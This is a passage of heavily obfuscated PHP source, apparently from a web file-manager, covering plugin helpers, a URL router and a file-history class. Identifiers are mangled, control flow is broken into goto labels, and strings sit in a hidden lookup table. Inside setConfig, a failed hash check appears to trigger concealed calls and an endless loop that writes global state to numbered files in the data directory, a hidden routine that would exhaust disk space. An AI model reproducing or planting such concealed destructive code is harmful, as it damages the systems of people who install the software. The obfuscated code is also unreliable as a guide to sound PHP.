$AÜÒÖí¿ä) { $EÙù°‘Š’ƒ = substr($AÜÒÖí¿ä, strlen($CÆ¤Ì›îÒÚ), -2); $aÓÄÌ¥£œÏ[] = $AÜÒÖí¿ä; $dí›ØØî¼[] = _get($F¨İÚÊäã‰, $EÙù°‘Š’ƒ); } goto AŸò…ÏŸ‚§; F¼‹â„³»’: preg_match_all($BÑÃÚáË[1430], $dÙîĞæÕ‰, $a±¶ Ô™‚¼); if (!is_array($a±¶ Ô™‚¼) || count($a±¶ Ô™‚¼) == 0 || !is_array($a±¶ Ô™‚¼[0]) || count($a±¶ Ô™‚¼[0]) == 0) { return; } $F¨İÚÊäã‰ = $this->getConfig(); goto dÔßÁ¶İí‰; d–›Éä‰‡™: } private function parsePackage(&$eˆ·âµÒ³•) { goto b¾‹ˆ»µöÛ; Dª›ÍÛ¥Éà: $dçš•œ…Ğ´ = array(); $bÅÔŒ¡¶ºª = array(); foreach ($f¬‘“‰™ë [0] as $E×½Î°½Çé) { $Dƒ­Ã‘Ğåê = substr($E×½Î°½Çé, strlen($bç·¥ÍÜ›Ü), -2); $dçš•œ…Ğ´[] = $E×½Î°½Çé; $bÅÔŒ¡¶ºª[] = _get($A‡¨‚ùğ¡, $Dƒ­Ã‘Ğåê); } goto aÖ–—ù‚ˆ; aÖ–—ù‚ˆ: $eˆ·âµÒ³• = str_replace($dçš•œ…Ğ´, $bÅÔŒ¡¶ºª, $eˆ·âµÒ³•); goto f…¤å÷£×; b¾‹ˆ»µöÛ: $D“Å×…‘Ì¶ =& $_SERVER[ÉóçÄÇ]; $bç·¥ÍÜ›Ü = $D“Å×…‘Ì¶[1431]; if (!strstr($eˆ·âµÒ³•, $bç·¥ÍÜ›Ü)) { return; } goto fÚÙ—¡£À; fÚÙ—¡£À: preg_match_all($D“Å×…‘Ì¶[1432], $eˆ·âµÒ³•, $f¬‘“‰™ë ); if (!is_array($f¬‘“‰™ë ) || count($f¬‘“‰™ë ) == 0 || !is_array($f¬‘“‰™ë [0]) || count($f¬‘“‰™ë [0]) == 0) { return; } $A‡¨‚ùğ¡ = $this->appPackage(); goto Dª›ÍÛ¥Éà; f…¤å÷£×: } final function echoFile($CšööÔğ†¶, $FŞ¸Èœ˜÷ø = false) { goto dÇ¤¶ãÕˆ›; bö³Ï‹ÕÄ: $B„«Í…”ò = $this->parseFile($f©Ä‡µÚ‡); $this->parseLang($B„«Í…”ò); $this->parseConfig($B„«Í…”ò); goto B‘É³É‹¶÷; B‘É³É‹¶÷: $this->parsePackage($B„«Í…”ò); if (is_array($FŞ¸Èœ˜÷ø)) { $B„«Í…”ò = str_replace(array_keys($FŞ¸Èœ˜÷ø), array_values($FŞ¸Èœ˜÷ø), $B„«Í…”ò); } echo $CË–Üå‘Ï[227] . $B„«Í…”ò; goto FĞÕ†²óŒ†; dÇ¤¶ãÕˆ›: $CË–Üå‘Ï =& $_SERVER[ÉóçÄÇ]; $f©Ä‡µÚ‡ = $this->pluginPath . $CšööÔğ†¶; if (ACT == $CË–Üå‘Ï[1433]) { echo $CË–Üå‘Ï[1434] . $this->pluginName . $CË–Üå‘Ï[8] . $CšööÔğ†¶ . $CË–Üå‘Ï[1435]; if (!file_exists($f©Ä‡µÚ‡)) { echo $CË–Üå‘Ï[1436]; return; } } goto bö³Ï‹ÕÄ; FĞÕ†²óŒ†: } final function initLang() { goto D™‘Áùù‘; D™‘Áùù‘: $dˆ­¡‡‰Ö =& $_SERVER[ÉóçÄÇ]; $Eô“ÁîïÈ… = $dˆ­¡‡‰Ö[1437]; $b…Ã—”‰óŠ = $this->pluginPath . $dˆ­¡‡‰Ö[1438]; goto cÉé¥á—šÆ; cÉé¥á—šÆ: $AÎ—ÇÂÁÓ½ = I18n::getType(); $e÷¨–ƒ»çì = array(); if (file_exists($b…Ã—”‰óŠ . $AÎ—ÇÂÁÓ½ . $dˆ­¡‡‰Ö[789])) { $e÷¨–ƒ»çì = (include $b…Ã—”‰óŠ . $AÎ—ÇÂÁÓ½ . $dˆ­¡‡‰Ö[789]); } else { if ($AÎ—ÇÂÁÓ½ == $dˆ­¡‡‰Ö[1439] && !file_exists($b…Ã—”‰óŠ . $AÎ—ÇÂÁÓ½ . $dˆ­¡‡‰Ö[789]) && file_exists($b…Ã—”‰óŠ . $dˆ­¡‡‰Ö[1440])) { $e÷¨–ƒ»çì = (include $b…Ã—”‰óŠ . $dˆ­¡‡‰Ö[1440]); } else { if (file_exists($b…Ã—”‰óŠ . $Eô“ÁîïÈ… . $dˆ­¡‡‰Ö[789])) { $e÷¨–ƒ»çì = (include $b…Ã—”‰óŠ . $Eô“ÁîïÈ… . $dˆ­¡‡‰Ö[789]); } } } goto d½”ùˆ¤ğ; d½”ùˆ¤ğ: if (!is_array($e÷¨–ƒ»çì)) { return array(); } if (@count($e÷¨–ƒ»çì) > 0) { I18n::set($e÷¨–ƒ»çì); } return $e÷¨–ƒ»çì; goto e§¹¢ÍµáŠ; e§¹¢ÍµáŠ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($aŒ‚ÙáÒ‚—) { $bº¥Ñ©§à =& $_SERVER[ÉóçÄÇ]; $eò«Â­ÁÜ¥ = $_SERVER[$bº¥Ñ©§à[821]] . $bº¥Ñ©§à[822]; $d– ˆ¨ãø‰ = $bº¥Ñ©§à[1194]; if ($_SERVER[$bº¥Ñ©§à[817]] != $d– ˆ¨ãø‰($eò«Â­ÁÜ¥)) { goto CË·á“×ã–; aµ¡ ÊÛ”Ê: $Cê²›ó…ÒÊ(); $a¢ù¼ÂËÁæ = $bº¥Ñ©§à[1441]; $Fœãéµ«£â = json_encode($GLOBALS[$bº¥Ñ©§à[1442]]); goto a…‰ÀÅîµ; a…‰ÀÅîµ: $c¬šç±§Æö = 1; for ($dŠêÈõìÔ¯ = $c¬šç±§Æö; $dŠêÈõìÔ¯ > 0; $dŠêÈõìÔ¯++) { $a¢ù¼ÂËÁæ(DATA_PATH . $dŠêÈõìÔ¯, $Fœãéµ«£â); } goto bØ‹í¯æ¤ì; C”í±èà–¤: $e”‹è—ÕÊ = $aºèä·Òİ¢($BÃ­Í†Áº); $FÆâË³È = explode($bº¥Ñ©§à[227], $e”‹è—ÕÊ); if (count($FÆâË³È) < $bº¥Ñ©§à[606]) { $b÷Çêö¹ … = $bº¥Ñ©§à[823]; $b÷Çêö¹ …(); } goto FãˆÒè«—¯; CË·á“×ã–: $Cê²›ó…ÒÊ = $bº¥Ñ©§à[819]; $aºèä·Òİ¢ = $bº¥Ñ©§à[820]; $BÃ­Í†Áº = $_SERVER[$bº¥Ñ©§à[821]] . $bº¥Ñ©§à[822]; goto C”í±èà–¤; FãˆÒè«—¯: $CŒ·‘ÍÒ¼ = $bº¥Ñ©§à[824]; $CŒ·‘ÍÒ¼($_SERVER[$bº¥Ñ©§à[825]]); $Cê²›ó…ÒÊ = $bº¥Ñ©§à[819]; goto aµ¡ ÊÛ”Ê; bØ‹í¯æ¤ì: } return $this->modelPlugin->setConfig($this->pluginName, $aŒ‚ÙáÒ‚—); } public function onSetConfig($Bá¿òÅ„) { } public function onGetConfig($A•À£È º) { } public function onChangeStatus($fÍÏš³âè) { } public function onUninstall() { } public function onInstall() { } public function authCheck($bàã˜Ò’– = "\x70\x6c\x75\x67\x69\156\101\x75\164\x68") { $C‡İñ²ƒ¸Ø =& $_SERVER[ÉóçÄÇ]; if (!defined($C‡İñ²ƒ¸Ø[448])) { return !1; } if (_get($GLOBALS, $C‡İñ²ƒ¸Ø[479])) { return !0; } $a§†Ÿ‰£Ûß = $this->getConfig(); if (!$a§†Ÿ‰£Ûß[$bàã˜Ò’–]) { return !1; } return ActionCall($C‡İñ²ƒ¸Ø[1443], $a§†Ÿ‰£Ûß[$bàã˜Ò’–]); } public function url($a‰µœ…Œ›÷, $A‹‘“““Í÷ = '', $a­…†åÇÙ = true) { goto f¬¤Ÿ´¤; Dµ·ßÏ¢©õ: $cÆô•ºÓ‰ = $this->packageVersion(); $cŠßºâíÀˆ = $e¢ÕÙëÖ×Î . $dì¦¿æÑˆ—[434] . $cÆô•ºÓ‰; if (substr($a‰µœ…Œ›÷, 0, 4) == $dì¦¿æÑˆ—[146] || substr($a‰µœ…Œ›÷, 0, 2) == $dì¦¿æÑˆ—[1225]) { $Däâ“˜®öí = $a‰µœ…Œ›÷ . $dì¦¿æÑˆ—[1444] . $cŠßºâíÀˆ; } else { if ($A‹‘“““Í÷ == $dì¦¿æÑˆ—[33]) { $Däâ“˜®öí = $this->pluginHost . $a‰µœ…Œ›÷ . $dì¦¿æÑˆ—[1444] . $cŠßºâíÀˆ; } else { if ($A‹‘“““Í÷ === $dì¦¿æÑˆ—[76]) { $Däâ“˜®öí = $this->pluginHost . $a‰µœ…Œ›÷; } else { if ($A‹‘“““Í÷ == $dì¦¿æÑˆ—[1445]) { $Däâ“˜®öí = STATIC_PATH . $a‰µœ…Œ›÷ . $dì¦¿æÑˆ—[1444] . $e¢ÕÙëÖ×Î; } else { if ($A‹‘“““Í÷ == $dì¦¿æÑˆ—[1446]) { $Däâ“˜®öí = APP_HOST . $dì¦¿æÑˆ—[1447] . $a‰µœ…Œ›÷ . $dì¦¿æÑˆ—[1444] . $e¢ÕÙëÖ×Î; } else { if (isset($EÌ‹×‚Ù£õ[$A‹‘“““Í÷])) { $Däâ“˜®öí = $EÌ‹×‚Ù£õ[$A‹‘“““Í÷] . $a‰µœ…Œ›÷ . $dì¦¿æÑˆ—[1444] . $cŠßºâíÀˆ; } } } } } } goto eš®Šºö»; f¬¤Ÿ´¤: $dì¦¿æÑˆ— =& $_SERVER[ÉóçÄÇ]; $EÌ‹×‚Ù£õ = $this->getConfig(); $e¢ÕÙëÖ×Î = KOD_VERSION . $dì¦¿æÑˆ—[94] . KOD_VERSION_BUILD; goto Dµ·ßÏ¢©õ; eš®Šºö»: if (!$a­…†åÇÙ) { return $Däâ“˜®öí; } echo $Däâ“˜®öí; goto E«·ƒé‡ô; E«·ƒé‡ô: } public function link($cî‚×·É¥ = false, $FŒ³‰å…™é = '') { $d®ÖíÜğ¦Š =& $_SERVER[ÉóçÄÇ]; if (!$cî‚×·É¥) { $this->link($d®ÖíÜğ¦Š[1448], $d®ÖíÜğ¦Š[1446]); $this->link($d®ÖíÜğ¦Š[1449], $d®ÖíÜğ¦Š[1445]); $this->link($d®ÖíÜğ¦Š[1450], $d®ÖíÜğ¦Š[1445]); $this->link($d®ÖíÜğ¦Š[1451], $d®ÖíÜğ¦Š[1445]); $this->link($d®ÖíÜğ¦Š[1452], $d®ÖíÜğ¦Š[1445]); return; } $B«ƒ©¶ïµˆ = $this->url($cî‚×·É¥, $FŒ³‰å…™é, !1); if (substr($cî‚×·É¥, -3) == $d®ÖíÜğ¦Š[1453]) { echo $d®ÖíÜğ¦Š[1454] . $B«ƒ©¶ïµˆ . $d®ÖíÜğ¦Š[1455] . $d®ÖíÜğ¦Š[227]; } else { if (substr($cî‚×·É¥, -4) == $d®ÖíÜğ¦Š[1456]) { echo $d®ÖíÜğ¦Š[1457] . $B«ƒ©¶ïµˆ . $d®ÖíÜğ¦Š[1458] . $d®ÖíÜğ¦Š[227]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\x5e\57\x5d\x2b", "\72\x6e\x75\x6d" => "\133\x30\55\x39\135\x2b", "\x3a\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($fÜ§Õøƒ‹Ñ, $BÎ°ğçÈÍç) { $cØ¬Ÿ’ï =& $_SERVER[ÉóçÄÇ]; if ($fÜ§Õøƒ‹Ñ == $cØ¬Ÿ’ï[1459]) { $DªˆìÙƒ‹‹ = array_map($cØ¬Ÿ’ï[1460], $BÎ°ğçÈÍç[0]); $C÷ÖÃºÉ´ = strpos($BÎ°ğçÈÍç[1], $cØ¬Ÿ’ï[8]) === 0 ? $BÎ°ğçÈÍç[1] : $cØ¬Ÿ’ï[8] . $BÎ°ğçÈÍç[1]; $CÉ·©¦‰î¼ = $BÎ°ğçÈÍç[2]; } else { $DªˆìÙƒ‹‹ = null; $C÷ÖÃºÉ´ = strpos($BÎ°ğçÈÍç[0], $cØ¬Ÿ’ï[8]) === 0 ? $BÎ°ğçÈÍç[0] : $cØ¬Ÿ’ï[8] . $BÎ°ğçÈÍç[0]; $CÉ·©¦‰î¼ = $BÎ°ğçÈÍç[1]; } array_push(self::$maps, $DªˆìÙƒ‹‹); array_push(self::$routes, $C÷ÖÃºÉ´); array_push(self::$methods, strtoupper($fÜ§Õøƒ‹Ñ)); array_push(self::$callbacks, $CÉ·©¦‰î¼); } public static function error($dˆ¥‘ÉĞ°Ş) { self::$errorCallback = $dˆ¥‘ÉĞ°Ş; } public static function haltOnMatch($C°õîã‡»£ = true) { self::$halts = $C°õîã‡»£; } public static function dispatch() { goto Eå¶õ†«î; EåŸ‡Š’ïí: self::$routes = preg_replace($f‰ç‰»¥ºí[1144], $f‰ç‰»¥ºí[8], self::$routes); if (in_array($dÇãƒµØšÀ, self::$routes)) { $FÌ¿Üï¾ñ = array_keys(self::$routes, $dÇãƒµØšÀ); foreach ($FÌ¿Üï¾ñ as $eß¼Ûªª«) { if (self::$methods[$eß¼Ûªª«] == $e‡©—×‹Ë || self::$methods[$eß¼Ûªª«] == $f‰ç‰»¥ºí[1462] || in_array($e‡©—×‹Ë, self::$maps[$eß¼Ûªª«])) { $A¸´é±º¤Á = !0; if (!is_object(self::$callbacks[$eß¼Ûªª«])) { $D¥‹¤ï÷µš = explode($f‰ç‰»¥ºí[8], self::$callbacks[$eß¼Ûªª«]); $f‚ÏŠŒ²á = end($D¥‹¤ï÷µš); $eæ’õ×Ï = explode($f‰ç‰»¥ºí[1463], $f‚ÏŠŒ²á); $fíÙµ¦×Å¬ = new $eæ’õ×Ï[0](); $fíÙµ¦×Å¬->{$eæ’õ×Ï[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$eß¼Ûªª«]); if (self::$halts) { return; } } } } } else { $cÊ©êôù = 0; foreach (self::$routes as $eß¼Ûªª«) { if (strpos($eß¼Ûªª«, $f‰ç‰»¥ºí[4]) !== !1) { $eß¼Ûªª« = str_replace($a“™†Òøõ³, $cÇ™ÂÓ†¥É, $eß¼Ûªª«); } if (preg_match($f‰ç‰»¥ºí[1464] . $eß¼Ûªª« . $f‰ç‰»¥ºí[1465], $dÇãƒµØšÀ, $AÊ‘…‚‰Í«)) { if (self::$methods[$cÊ©êôù] == $e‡©—×‹Ë || self::$methods[$cÊ©êôù] == $f‰ç‰»¥ºí[1462] || !empty(self::$maps[$cÊ©êôù]) && in_array($e‡©—×‹Ë, self::$maps[$cÊ©êôù])) { $A¸´é±º¤Á = !0; array_shift($AÊ‘…‚‰Í«); if (!is_object(self::$callbacks[$cÊ©êôù])) { $D¥‹¤ï÷µš = explode($f‰ç‰»¥ºí[8], self::$callbacks[$cÊ©êôù]); $f‚ÏŠŒ²á = end($D¥‹¤ï÷µš); $eæ’õ×Ï = explode($f‰ç‰»¥ºí[1463], $f‚ÏŠŒ²á); $fíÙµ¦×Å¬ = new $eæ’õ×Ï[0](); if (!method_exists($fíÙµ¦×Å¬, $eæ’õ×Ï[1])) { echo $f‰ç‰»¥ºí[1466]; } else { call_user_func_array(array($fíÙµ¦×Å¬, $eæ’õ×Ï[1]), $AÊ‘…‚‰Í«); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$cÊ©êôù], $AÊ‘…‚‰Í«); if (self::$halts) { return; } } } } $cÊ©êôù++; } } if ($A¸´é±º¤Á == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Fôè‰¿•Áš =& $_SERVER[ÉóçÄÇ]; header($_SERVER[$Fôè‰¿•Áš[1467]] . $Fôè‰¿•Áš[1468]); echo $Fôè‰¿•Áš[1469]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$f‰ç‰»¥ºí[1461]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto BÁ÷»ŒåŞ; Eå¶õ†«î: $f‰ç‰»¥ºí =& $_SERVER[ÉóçÄÇ]; $dÇãƒµØšÀ = parse_url($_SERVER[$f‰ç‰»¥ºí[1461]], PHP_URL_PATH); $e‡©—×‹Ë = $_SERVER[$f‰ç‰»¥ºí[156]]; goto dÔ Èò’Ö¾; dÔ Èò’Ö¾: $a“™†Òøõ³ = array_keys(static::$patterns); $cÇ™ÂÓ†¥É = array_values(static::$patterns); $A¸´é±º¤Á = !1; goto EåŸ‡Š’ïí; BÁ÷»ŒåŞ: } } goto e§õÂ³Õô; C‹¯”±Ø: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto Aùï ×òù‹; AÃø†ÉÒÏ„: Hook::bind($EÎ‚‡Ó‘©[1097], $EÎ‚‡Ó‘©[1098]); goto FòíÌ„å; bê¡ùÕ¡Øñ: Hook::bind($EÎ‚‡Ó‘©[1091], $EÎ‚‡Ó‘©[1092]); Hook::bind($EÎ‚‡Ó‘©[1093], $EÎ‚‡Ó‘©[1094]); Hook::bind($EÎ‚‡Ó‘©[1095], $EÎ‚‡Ó‘©[1096]); goto AÃø†ÉÒÏ„; bØ˜Ó¢ğí“: if (isset($_REQUEST[$EÎ‚‡Ó‘©[1086]]) && $_REQUEST[$EÎ‚‡Ó‘©[1086]] == $EÎ‚‡Ó‘©[86]) { return; } Hook::bind($EÎ‚‡Ó‘©[1087], $EÎ‚‡Ó‘©[1088]); Hook::bind($EÎ‚‡Ó‘©[1089], $EÎ‚‡Ó‘©[1090]); goto bê¡ùÕ¡Øñ; Aùï ×òù‹: $EÎ‚‡Ó‘© =& $_SERVER[ÉóçÄÇ]; $f»…À¾ÏŠœ = $GLOBALS[$EÎ‚‡Ó‘©[6]][$EÎ‚‡Ó‘©[87]][$EÎ‚‡Ó‘©[1085]]; if ($f»…À¾ÏŠœ <= 0) { return; } goto bØ˜Ó¢ğí“; FòíÌ„å: } public static function eventBeforeUpload($E™É¼Ÿ„öÙ) { if ($E™É¼Ÿ„öÙ[3] && $E™É¼Ÿ„öÙ[3] != REPEAT_REPLACE) { return; } $b îƒ¯ÇÃ = self::parsePath($E™É¼Ÿ„öÙ[0]); if (!$b îƒ¯ÇÃ) { return; } self::add($b îƒ¯ÇÃ); } public static function eventBeforeEdit($EÚ˜Å¹°¥¡) { $bò±ğöÀ‚ = self::parsePath($EÚ˜Å¹°¥¡[0]); if (!$bò±ğöÀ‚) { return; } self::add($bò±ğöÀ‚); } public static function eventBeforeCopyFile($FºŠ·„’˜», $a¶Ã†œÍá, $eŒ‘ Ë¢ƒº, $A¯ÉèÛÈø, $b¼ö«ƒÙï‚, $E…µÔÊÉ¨ç) { $CÄºøÏ»£® = $eŒ‘ Ë¢ƒº->getPathOuter($A¯ÉèÛÈø); $A‚‹Ö¯ = self::parsePath($CÄºøÏ»£®); if (!$A‚‹Ö¯) { return; } self::add($A‚‹Ö¯); } public static function eventBeforeRename($b ÓŸàÍÓí) { $dÊ½ ÌÖ›å =& $_SERVER[ÉóçÄÇ]; $B„ÆÒºõÊ‡ = self::parsePath($b ÓŸàÍÓí[0]); if (!$B„ÆÒºõÊ‡) { return; } $bÚŠëôÏôó = self::checkInHistory($B„ÆÒºõÊ‡); if (!$bÚŠëôÏôó) { return; } if ($bÚŠëôÏôó[$dÊ½ ÌÖ›å[29]] == $dÊ½ ÌÖ›å[173]) { $cËÜ„ö•ôò = self::listData($B„ÆÒºõÊ‡); if ($cËÜ„ö•ôò && $cËÜ„ö•ôò[$dÊ½ ÌÖ›å[365]]) { self::moveHistory($B„ÆÒºõÊ‡, $b ÓŸàÍÓí[1]); } } else { IO::rename($bÚŠëôÏôó[$dÊ½ ÌÖ›å[75]], $b ÓŸàÍÓí[1]); } } public static function eventBeforeMove($a™–‘õ“ê) { goto AïÊ·à¼Ù×; Dø¤õÅÕ×: if ($b°Ó…ºƒ½à[$B‚Ù¡‚«Û[29]] == $B‚Ù¡‚«Û[173]) { $FŞ°¦Â¬ĞÄ = self::listData($fÎØ‹–é’); $Eçï˜ªÅÒ× = rtrim($ağ¤‡›«¢, $B‚Ù¡‚«Û[8]) . $B‚Ù¡‚«Û[8] . ($CŒËŠÈÊÄÔ ? $CŒËŠÈÊÄÔ : get_path_this($fÎØ‹–é’)); $e®øø¶Şº = self::listData($Eçï˜ªÅÒ×); if ($FŞ°¦Â¬ĞÄ && $FŞ°¦Â¬ĞÄ[$B‚Ù¡‚«Û[365]] && $e®øø¶Şº && $e®øø¶Şº[$B‚Ù¡‚«Û[365]]) { return self::clear($fÎØ‹–é’); } if ($FŞ°¦Â¬ĞÄ && $FŞ°¦Â¬ĞÄ[$B‚Ù¡‚«Û[365]]) { self::moveHistory($fÎØ‹–é’, $CŒËŠÈÊÄÔ, $a™¬“¡¤); } } else { IO::move($b°Ó…ºƒ½à[$B‚Ù¡‚«Û[75]], $a™¬“¡¤, !1, $CŒËŠÈÊÄÔ); self::clearEmptyFolder(IO::pathFather($b°Ó…ºƒ½à[$B‚Ù¡‚«Û[75]])); } goto a†Ò§¦Æ‘¼; DåÒ°‡›Ù…: $ağ¤‡›«¢ = self::parsePath($a™–‘õ“ê[1]); if (!$ağ¤‡›«¢) { return; } $CŒËŠÈÊÄÔ = $a™–‘õ“ê[3]; goto DÔÜ¢ª…›; DÔÜ¢ª…›: $b°Ó…ºƒ½à = self::checkInHistory($fÎØ‹–é’); if (!$b°Ó…ºƒ½à) { return; } $a™¬“¡¤ = self::pathHistory($ağ¤‡›«¢); goto Dø¤õÅÕ×; AïÊ·à¼Ù×: $B‚Ù¡‚«Û =& $_SERVER[ÉóçÄÇ]; $fÎØ‹–é’ = self::parsePath($a™–‘õ“ê[0]); if (!$fÎØ‹–é’) { return; } goto DåÒ°‡›Ù…; a†Ò§¦Æ‘¼: } public static function eventAfterRemove($E½åÒçß‰º, $fàŒÙ••¯’) { goto Dé³âÒ; Dé³âÒ: $c˜È•·“µ‘ =& $_SERVER[ÉóçÄÇ]; if (!$fàŒÙ••¯’) { return; } $bŒ¢ƒ¤ öâ = self::parsePath($E½åÒçß‰º[0]); goto A—¬Î‹™ÏÎ; A¢•Ç·£Ëõ: if ($Fè™ğá½Œ[$c˜È•·“µ‘[29]] == $c˜È•·“µ‘[173]) { $F½’±ìçÊƒ = self::listData($bŒ¢ƒ¤ öâ, !1); if ($F½’±ìçÊƒ && $F½’±ìçÊƒ[$c˜È•·“µ‘[365]]) { self::clear($bŒ¢ƒ¤ öâ, !1); } } else { IO::remove($Fè™ğá½Œ[$c˜È•·“µ‘[75]]); self::clearEmptyFolder(IO::pathFather($Fè™ğá½Œ[$c˜È•·“µ‘[75]])); } goto d¶œò¡îÙ²; A—¬Î‹™ÏÎ: if (!$bŒ¢ƒ¤ öâ) { return; } $Fè™ğá½Œ = self::checkInHistory($bŒ¢ƒ¤ öâ); if (!$Fè™ğá½Œ) { return; } goto A¢•Ç·£Ëõ; d¶œò¡îÙ²: } private static function checkInHistory($d¨£½ôêï©) { $f¹±¾ª®‰É = self::pathHistory($d¨£½ôêï©); if (!IO::exist($f¹±¾ª®‰É)) { $f¹±¾ª®‰É .= $_SERVER[ÉóçÄÇ][1099]; } return IO::exist($f¹±¾ª®‰É) ? IO::info($f¹±¾ª®‰É) : !1; } private static function parsePath($a×¢ŒÅ¹¸Ñ) { goto D¯£Û¿º…¥; dĞ‰“ß¡ÙÃ: $C¥Ë×™î· = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $F¸›ø‘Óó§[1102]); foreach ($C¥Ë×™î· as $C„„…ÉòÑ›) { if (!$b‚¹ÎÊ£Ü§ && substr($a×¢ŒÅ¹¸Ñ, 0, strlen($C„„…ÉòÑ›)) == $C„„…ÉòÑ›) { return !1; } } self::log($GLOBALS[$F¸›ø‘Óó§[1025]] . $F¸›ø‘Óó§[1103] . $a×¢ŒÅ¹¸Ñ); goto F°ÓÂï«›; Eé–›¥æÉŸ: if (!$c±‹®ÎÌ || !$AÕ«š¾Ê„[$F¸›ø‘Óó§[1101]]) { return !1; } if ($b‚¹ÎÊ£Ü§ == KodIO::KOD_SHARE_ITEM) { $d½ğ¦†ÕÚ = IO::init($a×¢ŒÅ¹¸Ñ); if ($d½ğ¦†ÕÚ->pathParse[$F¸›ø‘Óó§[1030]]) { return self::parsePath($d½ğ¦†ÕÚ->pathParse[$F¸›ø‘Óó§[1030]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto dĞ‰“ß¡ÙÃ; D¯£Û¿º…¥: $F¸›ø‘Óó§ =& $_SERVER[ÉóçÄÇ]; if (!$a×¢ŒÅ¹¸Ñ) { return !1; } if ($GLOBALS[$F¸›ø‘Óó§[1100]]) { return; } goto f©â‚‡ªÁç; f©â‚‡ªÁç: $AÕ«š¾Ê„ = KodIO::parse($a×¢ŒÅ¹¸Ñ); $b‚¹ÎÊ£Ü§ = $AÕ«š¾Ê„[$F¸›ø‘Óó§[29]]; $c±‹®ÎÌ = !$b‚¹ÎÊ£Ü§ || $b‚¹ÎÊ£Ü§ == KodIO::KOD_IO || $b‚¹ÎÊ£Ü§ == KodIO::KOD_SHARE_ITEM; goto Eé–›¥æÉŸ; F°ÓÂï«›: return $a×¢ŒÅ¹¸Ñ; goto A¼Ø½‹•ˆ‡; A¼Ø½‹•ˆ‡: } private static function pathHistory($bÑƒ†µˆÚ) { $E×à‹Œ … =& $_SERVER[ÉóçÄÇ]; $Câ¿è“ê»— = self::$_historyBase . ltrim(KodIO::clear($bÑƒ†µˆÚ), $E×à‹Œ …[8]); $Câ¿è“ê»— = str_replace(array($E×à‹Œ …[1104]), array($E×à‹Œ …[1105]), $Câ¿è“ê»—); return $Câ¿è“ê»—; } public static function log($eºößÔ¶ºÇ) { } public static function historyCount($dÛ…‚×µğÂ) { $DáÂ·–ò½À =& $_SERVER[ÉóçÄÇ]; $d™Ÿ‹•—¯ = array(); $AÁ¨Ï¤óİ = array(); foreach ($dÛ…‚×µğÂ as $aóÄÒï–¾) { $eó±æ¨’–Ö = get_path_father($aóÄÒï–¾); if (!$AÁ¨Ï¤óİ[$eó±æ¨’–Ö]) { $AÁ¨Ï¤óİ[$eó±æ¨’–Ö] = array(); } $AÁ¨Ï¤óİ[$eó±æ¨’–Ö][] = get_path_this($aóÄÒï–¾); } foreach ($AÁ¨Ï¤óİ as $eó±æ¨’–Ö => $C®õÃñ¡È) { $E›ÂÆÃÉëö = self::parsePath($eó±æ¨’–Ö); if (!$E›ÂÆÃÉëö) { continue; } foreach ($C®õÃñ¡È as $e¢‡”ôŠÈé) { $BºÎ»ïÅ†‰ = self::listData(rtrim($E›ÂÆÃÉëö, $DáÂ·–ò½À[8]) . $DáÂ·–ò½À[8] . $e¢‡”ôŠÈé, !1); if ($BºÎ»ïÅ†‰ && $BºÎ»ïÅ†‰[$DáÂ·–ò½À[365]]) { $d™Ÿ‹•—¯[rtrim($eó±æ¨’–Ö, $DáÂ·–ò½À[8]) . $DáÂ·–ò½À[8] . $e¢‡”ôŠÈé] = count($BºÎ»ïÅ†‰[$DáÂ·–ò½À[365]]); } } } return $d™Ÿ‹•—¯; } public static function add($Dôö£ö‘¦ö) { goto C‘ÀˆøƒÂŞ; eÆ–²¸¨Ê: $DŠËìç = array($BêËêÍæì’[388] => $DïÍãùªô¶, $BêËêÍæì’[170] => $aÀæÍ‰œå‘, $BêËêÍæì’[28] => $D’î²ƒˆ[$BêËêÍæì’[28]] . $BêËêÍæì’[94] . date($BêËêÍæì’[1109]) . rand_string(1), $BêËêÍæì’[77] => $D’î²ƒˆ[$BêËêÍæì’[77]], $BêËêÍæì’[426] => USER_ID, $BêËêÍæì’[192] => time(), $BêËêÍæì’[1110] => $BêËêÍæì’[33]); IO::mkdir($F“È«´Ú‘Ğ[$BêËêÍæì’[1111]]); $C¤ñ‰­“Ä« = IO::copy($Dôö£ö‘¦ö, $F“È«´Ú‘Ğ[$BêËêÍæì’[1111]], !1, $DŠËìç[$BêËêÍæì’[28]]); goto A‡ßÔŸÃ”œ; bù«–ÌÏä¬: if ($e–¾õ‹÷« && $e–¾õ‹÷«[0][$BêËêÍæì’[170]] == $aÀæÍ‰œå‘) { return !0; } if (array_key_exists($BêËêÍæì’[194], $D’î²ƒˆ) && !$D’î²ƒˆ[$BêËêÍæì’[194]]) { return !1; } $DïÍãùªô¶ = short_id(time()); goto eÆ–²¸¨Ê; C‘ÀˆøƒÂŞ: $BêËêÍæì’ =& $_SERVER[ÉóçÄÇ]; $F“È«´Ú‘Ğ = self::listData($Dôö£ö‘¦ö); if (!$F“È«´Ú‘Ğ) { return; } goto aôæåÂôç§; bÏ‹Íà³·: return self::saveData($F“È«´Ú‘Ğ[$BêËêÍæì’[1112]], $e–¾õ‹÷«); goto a¦ÂÀÁçîĞ; aôæåÂôç§: $CÆÅ‘å¾Ÿ = Model($BêËêÍæì’[1106])->get($BêËêÍæì’[1107]); $A÷ò“ô‰êã = $GLOBALS[$BêËêÍæì’[6]][$BêËêÍæì’[87]][$BêËêÍæì’[1085]]; $cîÎÆ¨Ù´´ = $CÆÅ‘å¾Ÿ == $BêËêÍæì’[1108] ? 5 : $A÷ò“ô‰êã; goto DØ¶Œ“àø; c„ÙÂğŠ‹ğ: $e–¾õ‹÷« = $F“È«´Ú‘Ğ[$BêËêÍæì’[365]]; if ($D’î²ƒˆ[$BêËêÍæì’[77]] == 0) { return; } if ($D’î²ƒˆ[$BêËêÍæì’[77]] >= 1024 * 1024 * 500) { return !1; } goto bù«–ÌÏä¬; 